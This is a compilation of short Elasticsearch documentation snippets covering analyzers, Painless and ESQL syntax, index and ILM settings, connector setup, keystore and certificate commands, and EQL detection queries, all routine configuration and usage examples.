TITLE: Configuring ICU Normalization Filters in Elasticsearch
DESCRIPTION: Example showing how to configure both default NFKC_CF normalization and custom NFD normalization character filters in Elasticsearch. The configuration includes creating custom analyzers with different normalization settings and demonstrates the use of the icu_normalizer character filter.

LANGUAGE: console
CODE:
PUT icu_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "nfkc_cf_normalized": {
            "tokenizer": "icu_tokenizer",
            "char_filter": [
              "icu_normalizer"
            ]
          },
          "nfd_normalized": {
            "tokenizer": "icu_tokenizer",
            "char_filter": [
              "nfd_normalizer"
            ]
          }
        },
        "char_filter": {
          "nfd_normalizer": {
            "type": "icu_normalizer",
            "name": "nfc",
            "mode": "decompose"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using Conditional Operator in Painless
DESCRIPTION: Examples of using the ternary conditional operator for various data types and conditions.

LANGUAGE: painless
CODE:
boolean b = true;        
int x = b ? 1 : 2;       
List y = x > 1 ? new ArrayList() : null; 
def z = x < 2 ? x : 2.0;

----------------------------------------

TITLE: Function Operations on Multivalued Fields
DESCRIPTION: Illustrates how ESQL functions handle multivalued fields and shows workarounds using aggregation functions like MV_MIN.

LANGUAGE: console
CODE:
POST /mv/_bulk?refresh
{ "index" : {} }
{ "a": 1, "b": [2, 1] }
{ "index" : {} }
{ "a": 2, "b": 3 }

POST /_query
{
  "query": "FROM mv | EVAL b=MV_MIN(b) | EVAL b + 2, a + b | LIMIT 4"
}

----------------------------------------

TITLE: Bulk Loading Test Data
DESCRIPTION: Loads sample Windows event log data using the bulk API.

LANGUAGE: sh
CODE:
curl -H "Content-Type: application/json" -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" --data-binary "@normalized-T1117-AtomicRed-regsvr32.json"

----------------------------------------

TITLE: Creating Elasticsearch Index (Version 6)
DESCRIPTION: Creates an Elasticsearch index with specific settings and mappings for version 6, including shard and replica configurations, and field definitions.

LANGUAGE: json
CODE:
PUT /index
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "_doc": {
      "properties": {
        "title": {
          "type": "text"
        },
        "content": {
          "type": "text"
        },
        "created_at": {
          "type": "date"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Script Compilation Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the script compilation circuit breaker in Elasticsearch. It includes a setting for the maximum compilation rate.

LANGUAGE: yaml
CODE:
script.max_compilations_rate: "150/5m"

----------------------------------------

TITLE: Discouraging Use of InetAddress.getLocalHost() in Java
DESCRIPTION: This snippet advises against using the getLocalHost() method from java.net.InetAddress.

LANGUAGE: java
CODE:
@defaultMessage Usage of getLocalHost is discouraged
java.net.InetAddress#getLocalHost()

----------------------------------------

TITLE: Identifying SecurityManager checkPermission Pattern in Java
DESCRIPTION: Demonstrates two common patterns for using SecurityManager's checkPermission method in Java code. The first pattern uses a private static permission field, while the second pattern creates the permission object directly.

LANGUAGE: java
CODE:
private static final RuntimePermission INET_ADDRESS_RESOLVER_PERMISSION =
new RuntimePermission("inetAddressResolverProvider");
...
sm.checkPermission(INET_ADDRESS_RESOLVER_PERMISSION);

LANGUAGE: java
CODE:
sm.checkPermission(new LinkPermission("symbolic"));

----------------------------------------

TITLE: Mathematical Functions in Elasticsearch SQL
DESCRIPTION: Mathematical and trigonometric functions for numerical calculations including absolute values, logarithms, and trigonometric operations.

LANGUAGE: sql
CODE:
ABS
ACOS
ASIN
ATAN
ATAN2
CBRT
CEIL
CEILING
COS
COSH
COT

----------------------------------------

TITLE: Documenting ESQL Query Parameters
DESCRIPTION: Documents the 'query' parameter which accepts a KQL format query string for ESQL function execution.

LANGUAGE: markdown
CODE:
`query`
:   Query string in KQL query string format.

----------------------------------------

TITLE: Defining DateTimeFormatterBuilder Class in Painless
DESCRIPTION: Defines the DateTimeFormatterBuilder class with methods for constructing custom date-time formatters by appending various components and patterns.

LANGUAGE: java
CODE:
class java.time.format.DateTimeFormatterBuilder {
  ()
  DateTimeFormatterBuilder append(DateTimeFormatter)
  DateTimeFormatterBuilder appendChronologyId()
  DateTimeFormatterBuilder appendChronologyText(TextStyle)
  DateTimeFormatterBuilder appendFraction(TemporalField,int,int,boolean)
  DateTimeFormatterBuilder appendInstant()
  DateTimeFormatterBuilder appendInstant(int)
  DateTimeFormatterBuilder appendLiteral(String)
  DateTimeFormatterBuilder appendLocalized(FormatStyle,FormatStyle)
  DateTimeFormatterBuilder appendLocalizedOffset(TextStyle)
  DateTimeFormatterBuilder appendOffset(String,String)
  DateTimeFormatterBuilder appendOffsetId()
  DateTimeFormatterBuilder appendOptional(DateTimeFormatter)
  DateTimeFormatterBuilder appendPattern(String)
  DateTimeFormatterBuilder appendText(TemporalField)
  DateTimeFormatterBuilder appendText(TemporalField,TextStyle)
  DateTimeFormatterBuilder appendValue(TemporalField)
  DateTimeFormatterBuilder appendValue(TemporalField,int)
  DateTimeFormatterBuilder appendValue(TemporalField,int,int,SignStyle)
  DateTimeFormatterBuilder appendValueReduced(TemporalField,int,int,int)
  DateTimeFormatterBuilder appendZoneId()
  DateTimeFormatterBuilder appendZoneOrOffsetId()
  DateTimeFormatterBuilder appendZoneRegionId()
  DateTimeFormatterBuilder appendZoneText(TextStyle)
  DateTimeFormatterBuilder appendZoneText(TextStyle,Set)
  String getLocalizedDateTimePattern(FormatStyle,FormatStyle,Chronology,Locale)
  DateTimeFormatterBuilder optionalEnd()
  DateTimeFormatterBuilder optionalStart()
  DateTimeFormatterBuilder padNext(int)
  DateTimeFormatterBuilder padNext(int,char)
  DateTimeFormatterBuilder parseCaseInsensitive()
  DateTimeFormatterBuilder parseCaseSensitive()
  DateTimeFormatterBuilder parseDefaulting(TemporalField,long)
  DateTimeFormatterBuilder parseLenient()
  DateTimeFormatterBuilder parseStrict()
  DateTimeFormatter toFormatter()
  DateTimeFormatter toFormatter(Locale)
}

----------------------------------------

TITLE: Computing Arcsine Using ASIN Function in ESQL
DESCRIPTION: Demonstrates how to calculate the arcsine of a decimal value using the ASIN function. The example takes a value of 0.9 and returns its arcsine in radians.

LANGUAGE: esql
CODE:
ROW a=.9
| EVAL asin=ASIN(a)

----------------------------------------

TITLE: Generate System Key File Example
DESCRIPTION: Example command showing how to generate a system_key file in the default Elasticsearch config directory.

LANGUAGE: sh
CODE:
bin/elasticsearch-syskeygen

----------------------------------------

TITLE: Removing Multiple Elasticsearch Plugins
DESCRIPTION: Command to remove multiple plugins from Elasticsearch in a single operation by specifying multiple plugin names.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin remove [pluginname] [pluginname] ... [pluginname]

----------------------------------------

TITLE: Writing YAML REST Test for Elasticsearch Plugin
DESCRIPTION: This YAML file defines a REST test for the custom token filter. It sends a request to the _analyze API with the custom filter and verifies the expected output.

LANGUAGE: yaml
CODE:
## Sample rest test
---
"Hello world plugin test - removes all tokens except hello and world":
  - do:
      indices.analyze:
        body:
          text: hello to everyone except the world
          tokenizer: standard
          filter:
            - type: "hello_world"
  - length: { tokens: 2 }
  - match:  { tokens.0.token: "hello" }
  - match:  { tokens.1.token: "world" }

----------------------------------------

TITLE: Running MongoDB Connector Docker Image
DESCRIPTION: Command to run the Docker image for the MongoDB connector, mounting the configuration file and setting necessary network options.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Exporting Keys and Certificates from PKCS12
DESCRIPTION: OpenSSL commands to export private keys and certificates from the PKCS12 keystore. The exported files need to be manually separated into individual key and certificate files.

LANGUAGE: bash
CODE:
openssl pkcs12 -in multi_signing.p12 -nocerts -nodes -out all_keys

openssl pkcs12 -in multi_signing.p12 -nokeys -out all_certs

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the 'field' parameter for an ESQL function. It explains that the input can be a single- or multi-valued column or an expression.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Configuring Health Status Logging in Elasticsearch
DESCRIPTION: Dynamic cluster settings for enabling and configuring periodic logging of health status indicators.

LANGUAGE: properties
CODE:
health.periodic_logger.enabled: false
health.periodic_logger.poll_interval: 60s

----------------------------------------

TITLE: Running EQL Correctness Tests in Debug Mode
DESCRIPTION: Enables debug mode for EQL correctness tests to check filtering subqueries of sequence queries.

LANGUAGE: shell
CODE:
./gradlew -p x-pack/plugin/eql/qa/correctness check -Dtests.eql_correctness_debug=true

LANGUAGE: shell
CODE:
./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests "org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}" -Dtests.eql_correctness_debug=true

----------------------------------------

TITLE: Parameter Documentation in Markdown
DESCRIPTION: Documentation for the angle parameter used in an ESQL trigonometric function. The parameter accepts angles in radians and returns null for null inputs.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`angle`
:   An angle, in radians. If `null`, the function returns `null`.

----------------------------------------

TITLE: IP Function Parameter Definitions in Markdown
DESCRIPTION: Markdown documentation defining three parameters: 'ip' for the IP address input, 'prefixLengthV4' for IPv4 prefix length, and 'prefixLengthV6' for IPv6 prefix length. Generated automatically by ESQL's AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`ip`
:   IP address of type `ip` (both IPv4 and IPv6 are supported).

`prefixLengthV4`
:   Prefix length for IPv4 addresses.

`prefixLengthV6`
:   Prefix length for IPv6 addresses.

----------------------------------------

TITLE: Configuring Time Series Start Time
DESCRIPTION: Setting to define the earliest acceptable @timestamp value for the index.

LANGUAGE: properties
CODE:
index.time_series.start_time: "2023-01-01T00:00:00Z"

----------------------------------------

TITLE: MEDIAN_ABSOLUTE_DEVIATION with Inline MV_MAX Function in ESQL
DESCRIPTION: Shows how to combine MEDIAN_ABSOLUTE_DEVIATION with the MV_MAX function to calculate the median absolute deviation of maximum values from a multivalued salary_change column.

LANGUAGE: esql
CODE:
FROM employees
| STATS m_a_d_max_salary_change = MEDIAN_ABSOLUTE_DEVIATION(MV_MAX(salary_change))

----------------------------------------

TITLE: Including TO_LONG Function Type Information in Markdown
DESCRIPTION: This snippet includes the markdown file containing the type information for the TO_LONG function.

LANGUAGE: markdown
CODE:
:::{include} ../types/to_long.md
:::

----------------------------------------

TITLE: Configuring Inference API Logging Settings
DESCRIPTION: Settings to control logging behavior and throttling for inference API failures. Includes reset interval and wait duration configurations.

LANGUAGE: yaml
CODE:
xpack.inference.logging.reset_interval: 1d
xpack.inference.logging.wait_duration: 1h

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function. It specifies that the function takes a 'point' parameter, which can be of various geometric types. The function returns null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`point`
:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.

----------------------------------------

TITLE: Defining Equivalent Synonyms in Elasticsearch
DESCRIPTION: Specifies equivalent synonyms separated by commas without explicit mapping. The mapping behavior is determined by the expand parameter in the token filter configuration.

LANGUAGE: plaintext
CODE:
ipod, i-pod, i pod
foozball , foosball
universe , cosmos
lol, laughing out loud

----------------------------------------

TITLE: Documenting Parameters for ESQL Geometric Comparison Function
DESCRIPTION: This snippet describes the parameters for an ESQL function that compares two geometric points. It specifies the types, null behavior, and constraints for the input parameters.

LANGUAGE: markdown
CODE:
**Parameters**

`geomA`
:   Expression of type `geo_point` or `cartesian_point`. If `null`, the function returns `null`.

`geomB`
:   Expression of type `geo_point` or `cartesian_point`. If `null`, the function returns `null`. The second parameter must also have the same coordinate system as the first. This means it is not possible to combine `geo_point` and `cartesian_point` parameters.

----------------------------------------

TITLE: Escaping Special Characters in Elasticsearch Regular Expressions
DESCRIPTION: Demonstrates how to escape special characters in regular expressions and JSON strings when using Elasticsearch. Shows indexing a document with a backslash and querying it with a regular expression.

LANGUAGE: json
CODE:
PUT my-index-000001/_doc/1
{
  "my_field": "a\\b"
}

LANGUAGE: json
CODE:
GET my-index-000001/_search
{
  "query": {
    "regexp": {
      "my_field.keyword": "a\\\\.*"
    }
  }
}

----------------------------------------

TITLE: Running Public Callers Finder Tool - Gradle Command
DESCRIPTION: Gradle command to execute the public callers finder tool. Takes an input CSV file and an optional boolean parameter for controlling recursion behavior.

LANGUAGE: shell
CODE:
./gradlew :libs:entitlement:tools:public-callers-finder:run <input-file> [<bubble-up-from-public>]

----------------------------------------

TITLE: EQL Process Query Example
DESCRIPTION: Example EQL query that matches process events with a specific process name.

LANGUAGE: eql
CODE:
process where process.name == "svchost.exe"

----------------------------------------

TITLE: Calculating Percentiles with PERCENTILE Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the PERCENTILE function in ESQL to calculate different percentiles of the 'salary' column from the 'employees' table. It calculates the 0th (minimum), 50th (median), and 99th percentiles.

LANGUAGE: sql
CODE:
FROM employees
| STATS p0 = PERCENTILE(salary,  0)
     , p50 = PERCENTILE(salary, 50)
     , p99 = PERCENTILE(salary, 99)

----------------------------------------

TITLE: Simulating Redact Processor with Multiple Patterns in Elasticsearch
DESCRIPTION: This example shows how to use the Redact processor with multiple patterns to obscure both IP addresses and email addresses. It also demonstrates customizing the prefix and suffix tokens for redacted content.

LANGUAGE: json
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "description": "Hide my IP",
    "processors": [
      {
        "redact": {
          "field": "message",
          "patterns": [
            "%{IP:REDACTED}",
            "%{EMAILADDRESS:REDACTED}"
          ],
          "prefix": "*",
          "suffix": "*"
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "message": "55.3.244.1 GET /index.html 15824 0.043 test@elastic.co"
      }
    }
  ]
}

----------------------------------------

TITLE: MySQL Connector Advanced Sync Rules Example
DESCRIPTION: This snippet demonstrates how to use advanced sync rules with the MySQL connector to pass arbitrary SQL statements.

LANGUAGE: JSON
CODE:
[
    {
        "tables": ["table1", "table2"],
        "query": "SELECT ... FROM ..."
    }
]

----------------------------------------

TITLE: Showing Keystore Settings
DESCRIPTION: Commands to display setting values from the keystore, including options for binary data.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore show the.name.of.the.setting.to.show

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore show -o my_file binary.setting.name

----------------------------------------

TITLE: Advanced Sync Rule Example
DESCRIPTION: JSON snippet for an advanced sync rule to skip extracting drive items older than 60 days.

LANGUAGE: json
CODE:
{
	"skipExtractingDriveItemsOlderThan": 60
}

----------------------------------------

TITLE: Recreating Stop Analyzer as Custom Analyzer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to recreate the built-in stop analyzer as a custom analyzer. It shows the configuration for creating a new index with a custom stop analyzer that can be further customized.

LANGUAGE: console
CODE:
PUT /stop_example
{
  "settings": {
    "analysis": {
      "filter": {
        "english_stop": {
          "type":       "stop",
          "stopwords":  "_english_"
        }
      },
      "analyzer": {
        "rebuilt_stop": {
          "tokenizer": "lowercase",
          "filter": [
            "english_stop"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This markdown snippet shows a table of supported types for 'angle' and 'result' parameters. It includes various numeric types such as double, integer, long, and unsigned_long.

LANGUAGE: markdown
CODE:
| angle | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Configuring and Using ICU Transform Filter in Elasticsearch
DESCRIPTION: Demonstrates the setup and usage of ICU transform token filter with examples of transliterating Chinese, Russian, and Japanese text to Latin script. The configuration includes a custom analyzer with keyword tokenizer and ICU transform filter that converts characters to Latin script, removes diacritics, and normalizes the text.

LANGUAGE: console
CODE:
PUT icu_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "latin": {
            "tokenizer": "keyword",
            "filter": [
              "myLatinTransform"
            ]
          }
        },
        "filter": {
          "myLatinTransform": {
            "type": "icu_transform",
            "id": "Any-Latin; NFD; [:Nonspacing Mark:] Remove; NFC"
          }
        }
      }
    }
  }
}

GET icu_sample/_analyze
{
  "analyzer": "latin",
  "text": "你好"
}

GET icu_sample/_analyze
{
  "analyzer": "latin",
  "text": "здравствуйте"
}

GET icu_sample/_analyze
{
  "analyzer": "latin",
  "text": "こんにちは"
}

----------------------------------------

TITLE: Defining and Calling Functions in Painless
DESCRIPTION: Example of defining a simple addition function and calling it with arguments.

LANGUAGE: painless
CODE:
int add(int x, int y) { 
      return x + y;
  }

int z = add(1, 2);

----------------------------------------

TITLE: Filtering an EQL search using Query DSL in Elasticsearch
DESCRIPTION: Demonstrates how to use Query DSL to filter the documents on which an EQL query runs in Elasticsearch.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search
{
  "filter": {
    "range": {
      "@timestamp": {
        "gte": "now-1d/d",
        "lt": "now/d"
      }
    }
  },
  "query": """
    file where (file.type == "file" and file.name == "cmd.exe")
  """
}

----------------------------------------

TITLE: Indexing and Searching Bit Vectors
DESCRIPTION: This example shows how to index and search bit vectors using the dense_vector field type with element_type set to bit.

LANGUAGE: console
CODE:
PUT my-bit-vectors
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "dense_vector",
        "dims": 40,
        "element_type": "bit"
      }
    }
  }
}

POST /my-bit-vectors/_bulk?refresh
{"index": {"_id" : "1"}}
{"my_vector": [127, -127, 0, 1, 42]}
{"index": {"_id" : "2"}}
{"my_vector": "8100012a7f"}

POST /my-bit-vectors/_search?filter_path=hits.hits
{
  "query": {
    "knn": {
      "query_vector": [127, -127, 0, 1, 42],
      "field": "my_vector"
    }
  }
}

----------------------------------------

TITLE: Setting Cluster Administrator Metadata
DESCRIPTION: Example of storing user-defined cluster metadata using the Cluster Settings API. Shows how to store an administrator email address in cluster metadata.

LANGUAGE: console
CODE:
PUT /_cluster/settings
{
  "persistent": {
    "cluster.metadata.administrator": "sysadmin@example.com"
  }
}

----------------------------------------

TITLE: Shell Command Execution in Java
DESCRIPTION: Shows how to execute shell commands in both bash and PowerShell environments using the Shell utility class.

LANGUAGE: java
CODE:
Shell sh = new Shell();

// equivalent to `bash -c 'echo $foo; echo $bar'`
sh.bash("echo $foo; echo $bar");

// equivalent to `powershell.exe -Command 'Write-Host $foo; Write-Host $bar'`
sh.powershell("Write-Host $foo; Write-Host $bar");

----------------------------------------

TITLE: Calculating Power with Integer Exponent in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the POW function to calculate the power of a number with an integer exponent. It uses a base of 2.0 and an exponent of 2 to calculate 2 squared.

LANGUAGE: esql
CODE:
ROW base = 2.0, exponent = 2
| EVAL result = POW(base, exponent)

----------------------------------------

TITLE: Word Stemming Rules in Elasticsearch
DESCRIPTION: Simple stemming rules that transform words ending in 'running' and 'runs' to their base form 'run', while preserving the word 'stemmer' unchanged.

LANGUAGE: text
CODE:
running, runs => run

stemmer => stemmer

----------------------------------------

TITLE: Extracting First Element from Split String using MV_FIRST in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_FIRST function in conjunction with SPLIT to extract the first element from a semicolon-separated string. It creates a row with a single field 'a', splits it by semicolon, and then retrieves the first element.

LANGUAGE: esql
CODE:
ROW a="foo;bar;baz"
| EVAL first_a = MV_FIRST(SPLIT(a, ";"))

----------------------------------------

TITLE: Numeric Type Casting in Painless
DESCRIPTION: Examples of valid numeric type casts in Painless, demonstrating implicit and explicit casts between different numeric types.

LANGUAGE: painless
CODE:
int a = 1;            
long b = a;           
short c = (short)b;   
double e = (double)a;

----------------------------------------

TITLE: Using OCTET_LENGTH Function in Elasticsearch SQL
DESCRIPTION: Returns the length in bytes of the input string expression.

LANGUAGE: sql
CODE:
SELECT OCTET_LENGTH('Elastic');

OCTET_LENGTH('Elastic')
-----------------------
7

----------------------------------------

TITLE: Filtered kNN Search in Elasticsearch
DESCRIPTION: Combines kNN vector search with a term filter to narrow results to specific file types.

LANGUAGE: console
CODE:
POST my-image-index/_search
{
  "size" : 10,
  "query" : {
    "bool" : {
      "must" : {
        "knn": {
          "field": "image-vector",
          "query_vector": [-5, 9, -12],
          "k": 3
        }
      },
      "filter" : {
        "term" : { "file-type" : "png" }
      }
    }
  }
}

----------------------------------------

TITLE: Using LEFT Function with Employee Data in ESQL
DESCRIPTION: Query that selects employee last names, extracts the first 3 characters using LEFT function, sorts the results alphabetically, and limits to 5 records. The output shows the original last_name and the extracted left substring.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL left = LEFT(last_name, 3)
| SORT last_name ASC
| LIMIT 5

----------------------------------------

TITLE: CSV-SPEC Warning Tests
DESCRIPTION: Examples demonstrating how to test for expected warnings in CSV-SPEC tests using both plain text and regex patterns.

LANGUAGE: csv-spec
CODE:
addLongOverflow
row max = 9223372036854775807 | eval sum = max + 1 | keep sum;

warning:Line 1:44: evaluation of [max + 1] failed, treating result as null. Only first 20 failures recorded.
warning:Line 1:44: java.lang.ArithmeticException: long overflow

sum:long
null
;

----------------------------------------

TITLE: Generating Self-Signed Certificate for Elasticsearch Using elasticsearch-certutil
DESCRIPTION: This bash script creates a self-signed certificate and key pair using elasticsearch-certutil. It generates a PEM format certificate valid for 9999 days with a 2048-bit key size, named 'signing'. The script then extracts the files and cleans up temporary artifacts.

LANGUAGE: bash
CODE:
elasticsearch-certutil cert --self-signed --pem --out ${PWD}/signing.zip -days 9999 -keysize 2048 -name "signing"
unzip signing.zip
mv signing/signing.* ./
rmdir signing
rm signing.zip

----------------------------------------

TITLE: Multiple Rollover Conditions
DESCRIPTION: ILM policy combining multiple conditions: rolls over after 7 days or 100GB, with minimum 1000 documents requirement.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover" : {
            "max_age": "7d",
            "max_size": "100gb",
            "min_docs": 1000
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Create Index with Text Field
DESCRIPTION: Creates an Elasticsearch index with a text field named 'full_text' for demonstration purposes.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "full_text": { "type": "text" }
    }
  }
}

----------------------------------------

TITLE: Static Imports for Date Field Script Methods in Painless
DESCRIPTION: Defines static imports for two methods used in date field scripts: 'emit' for collecting field values, and 'parse' for converting source values to milliseconds since epoch. These methods are bound to specific classes in the Elasticsearch codebase.

LANGUAGE: painless
CODE:
static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.DateFieldScript, long) bound_to org.elasticsearch.script.DateFieldScript$Emit
    # Parse a value from the source to millis since epoch
    long parse(org.elasticsearch.script.DateFieldScript, def) bound_to org.elasticsearch.script.DateFieldScript$Parse
}

----------------------------------------

TITLE: Example Usage of elasticsearch-setup-passwords Command
DESCRIPTION: Demonstrates how to use the elasticsearch-setup-passwords tool with a custom URL parameter to specify the endpoint for user management API requests.

LANGUAGE: shell
CODE:
bin/elasticsearch-setup-passwords auto -u "http://localhost:9201"

----------------------------------------

TITLE: ESQL Percentile Function Parameters
DESCRIPTION: Defines the required parameters for calculating percentiles in Elasticsearch SQL. The function takes a numeric multivalue expression and a percentile value between 0-100.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Multivalue expression.

`percentile`
:   The percentile to calculate. Must be a number between 0 and 100. Numbers out of range will return a null instead.

----------------------------------------

TITLE: Calculating Median Absolute Deviation and Median in ESQL
DESCRIPTION: This snippet demonstrates the use of MV_MEDIAN_ABSOLUTE_DEVIATION and MV_MEDIAN functions in ESQL. It creates a row with an array of integer values and calculates both the median absolute deviation and the median of those values.

LANGUAGE: esql
CODE:
ROW values = [0, 2, 5, 6]
| EVAL median_absolute_deviation = MV_MEDIAN_ABSOLUTE_DEVIATION(values), median = MV_MEDIAN(values)

----------------------------------------

TITLE: Searching Books by Title using MATCH with AND Operator in ESQL
DESCRIPTION: ESQL query that searches for books with titles containing both 'Hobbit' and 'Back Again' using an AND operator. The query returns only the title field.

LANGUAGE: esql
CODE:
FROM books
| WHERE MATCH(title, "Hobbit Back Again", {"operator": "AND"})
| KEEP title;

----------------------------------------

TITLE: Using GREATEST Function in ESQL
DESCRIPTION: Example showing how to use the GREATEST function to compare two integer values in a ROW context. The function returns the larger value between variables a and b.

LANGUAGE: esql
CODE:
ROW a = 10, b = 20
| EVAL g = GREATEST(a, b)

----------------------------------------

TITLE: Sorting Multi-Value Fields with mv_sort in ESQL
DESCRIPTION: This snippet demonstrates the usage of the mv_sort function to sort a multi-value field in both ascending and descending order. It creates a row with an array field 'a' and applies mv_sort to create sorted versions 'sa' (ascending) and 'sd' (descending).

LANGUAGE: esql
CODE:
ROW a = [4, 2, -3, 2]
| EVAL sa = mv_sort(a), sd = mv_sort(a, "DESC")

----------------------------------------

TITLE: Dynamic Type Casting in Painless
DESCRIPTION: Examples of dynamic type casting in Painless, demonstrating casts to and from the 'def' type.

LANGUAGE: painless
CODE:
def d0 = 3;               
d0 = new ArrayList();     
Object o = new HashMap(); 
def d1 = o;               
int i = d1.size();        

----------------------------------------

TITLE: Documenting Elasticsearch Function Test Case Parameters in Markdown
DESCRIPTION: This snippet defines two parameters, 'number' and 'percentile', for an Elasticsearch function test case. The descriptions for these parameters are left empty, indicating that additional information needs to be provided.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   

`percentile`
:   

----------------------------------------

TITLE: Using LTRIM Function in Elasticsearch SQL
DESCRIPTION: Removes leading blanks from the input string.

LANGUAGE: sql
CODE:
SELECT LTRIM('   Elastic');

LTRIM('   Elastic')
-------------------
Elastic

----------------------------------------

TITLE: Managing User Roles in Elasticsearch
DESCRIPTION: This snippet demonstrates how to modify the roles of a user named 'jacknich' by removing existing roles and adding a new role in a single command.

LANGUAGE: shell
CODE:
bin/elasticsearch-users roles jacknich -r network,monitoring -a user

----------------------------------------

TITLE: Implementing GeoShape Field Data Access in Java
DESCRIPTION: Abstract class that provides methods to access GeoShape field data values. Contains two methods: get(int) for accessing value at specific index and getValue() for retrieving current value.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.spatial.index.fielddata.plain.AbstractAtomicGeoShapeShapeFieldData$GeoShapeScriptValues {
  GeoShapeValues.GeoShapeValue get(int)
  GeoShapeValues.GeoShapeValue getValue()
}

----------------------------------------

TITLE: Missing Test Coverage Areas in Elasticsearch
DESCRIPTION: Lists missing test cases that need to be implemented for consistency and timeout functionality in Elasticsearch.

LANGUAGE: markdown
CODE:
# consistency
# timeout

----------------------------------------

TITLE: Applying Apache License Header Template
DESCRIPTION: Boilerplate license header text to be included at the top of source files. Requires replacing bracketed fields with actual copyright information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Running Elasticsearch Node Manually for EQL Tests
DESCRIPTION: Starts an Elasticsearch node manually for debugging purposes, allowing direct interaction with the node.

LANGUAGE: shell
CODE:
./gradlew :x-pack:plugin:eql:qa:correctness:runEqlCorrectnessNode --debug-jvm

----------------------------------------

TITLE: Analyzing Text with Fingerprint Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the Fingerprint filter to create a single output token from a given text input using the analyze API.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "whitespace",
  "filter" : ["fingerprint"],
  "text" : "zebra jumps over resting resting dog"
}

----------------------------------------

TITLE: Describing Lower Case Conversion Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides a description of the lower case conversion function in Elasticsearch ESQL. It explains that the function takes an input string and returns a new string with all characters converted to lower case.

LANGUAGE: plaintext
CODE:
**Description**

Returns a new string representing the input string converted to lower case.

----------------------------------------

TITLE: Indexing an Envelope shape in WKT format
DESCRIPTION: Example of indexing an envelope shape using the Well-Known Text (WKT) BBOX format in Elasticsearch. The order is minLon, maxLon, maxLat, minLat.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "BBOX (1000.0, 1002.0, 2000.0, 1000.0)"
}

----------------------------------------

TITLE: Executing Span Field Masking Query in Elasticsearch
DESCRIPTION: Demonstrates how to use span_field_masking query to perform span_near search across different field analyzers. The example shows searching across 'text' and 'text.stems' fields while masking the field difference to enable composite span queries. Includes highlighting configuration with require_field_match set to false.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_near": {
      "clauses": [
        {
          "span_term": {
            "text": "quick brown"
          }
        },
        {
          "span_field_masking": {
            "query": {
              "span_term": {
                "text.stems": "fox"
              }
            },
            "field": "text"
          }
        }
      ],
      "slop": 5,
      "in_order": false
    }
  },
  "highlight": {
    "require_field_match" : false,
    "fields": {
      "*": {}
    }
  }
}

----------------------------------------

TITLE: ESQL Type Mapping Table in Markdown
DESCRIPTION: A markdown table documenting the supported numeric type conversions in ESQL. Shows that integer, long and double input types all convert to double output type.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |

----------------------------------------

